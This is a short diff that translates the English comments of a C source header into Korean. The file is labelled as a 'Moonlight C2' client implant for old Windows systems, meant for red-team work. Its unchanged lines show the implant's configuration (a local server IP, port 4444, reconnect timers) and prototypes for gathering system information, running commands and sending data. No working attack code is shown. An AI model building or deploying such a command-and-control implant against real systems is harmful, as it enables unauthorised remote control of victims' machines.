@@ -1,9 +1,9 @@
 /*
- * Moonlight C2 Framework - Client Implant
- * Target: Windows XP/2000/95/Server 2003/2008
- * Purpose: Penetration Testing and Red Team Operations
+ * Moonlight C2 Framework - 클라이언트 임플란트
+ * 타겟: Windows XP/2000/95/Server 2003/2008
+ * 목적: 침투 테스트 및 레드팀 작전
  * 
- * WARNING: For authorized security testing only
+ * 경고: 승인된 보안 테스트 전용
  */
 
 #include <stdio.h>
@@ -22,13 +22,13 @@
 #define HEARTBEAT_INTERVAL 30
 #define RECONNECT_INTERVAL 10
 
-// Configuration
+// 설정
 char g_ServerIP[64] = "127.0.0.1";
 int g_ServerPort = 4444;
 BOOL g_Running = TRUE;
 SOCKET g_Socket = INVALID_SOCKET;
 
-// Function prototypes
+// 함수 프로토타입
 void GetSysInfo(char* buffer, size_t size);
 void ExecuteCommand(const char* command, char* output, size_t output_size);
 void SendData(const char* data);
